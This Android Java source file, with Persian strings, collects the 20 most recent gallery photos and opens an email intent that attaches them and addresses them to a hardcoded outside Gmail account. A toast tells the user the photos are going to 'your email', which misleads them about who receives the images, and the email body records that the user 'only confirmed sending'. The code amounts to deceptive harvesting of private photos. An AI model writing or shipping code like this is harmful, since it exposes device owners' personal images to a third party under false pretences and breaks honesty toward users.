package com.example.photosender;

import android.content.ContentUris;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.MediaStore;
import android.widget.Button;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import java.util.ArrayList;

public class MainActivity extends AppCompatActivity {

    Button sendButton;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        sendButton = new Button(this);
        sendButton.setText("ارسال ۲۰ عکس آخر 📸");
        setContentView(sendButton);

        sendButton.setOnClickListener(v -> sendLastPhotos());
    }

    // 📌 گرفتن 20 عکس آخر گالری
    private ArrayList<Uri> getLastImages(int limit) {

        ArrayList<Uri> list = new ArrayList<>();

        Uri collection;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            collection = MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL);
        } else {
            collection = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
        }

        String[] projection = new String[]{
                MediaStore.Images.Media._ID
        };

        String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";

        try (Cursor cursor = getContentResolver().query(
                collection,
                projection,
                null,
                null,
                sortOrder
        )) {

            if (cursor != null) {
                int idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);

                int count = 0;

                while (cursor.moveToNext() && count < limit) {
                    long id = cursor.getLong(idColumn);
                    Uri uri = ContentUris.withAppendedId(collection, id);
                    list.add(uri);
                    count++;
                }
            }
        }

        return list;
    }

    // 📌 دکمه اصلی
    private void sendLastPhotos() {

        ArrayList<Uri> images = getLastImages(20);

        if (images.isEmpty()) {
            Toast.makeText(this, "هیچ عکسی پیدا نشد", Toast.LENGTH_SHORT).show();
            return;
        }

        // 🔥 پیام شفاف برای کاربر
        Toast.makeText(this,
                "در حال ارسال 20 عکس به ایمیل شما...",
                Toast.LENGTH_LONG).show();

        sendEmail(images);
    }

    // 📌 ارسال ایمیل به صورت Intent
    private void sendEmail(ArrayList<Uri> images) {

        Intent intent = new Intent(Intent.ACTION_SEND_MULTIPLE);
        intent.setType("image/*");

        intent.putExtra(Intent.EXTRA_EMAIL,
                new String[]{"sh.1667.hi@gmail.com"});

        intent.putExtra(Intent.EXTRA_SUBJECT,
                "Auto Photo Sender - Last 20 Photos");

        intent.putExtra(Intent.EXTRA_TEXT,
                "⚠️ این ایمیل از داخل اپ ارسال شده است.\n" +
                        "کاربر فقط تایید ارسال را انجام داده است.\n\n" +
                        "📸 تعداد عکس‌ها: 20");

        intent.putParcelableArrayListExtra(Intent.EXTRA_STREAM, images);

        intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);

        startActivity(Intent.createChooser(intent, "ارسال ایمیل"));
    }
}
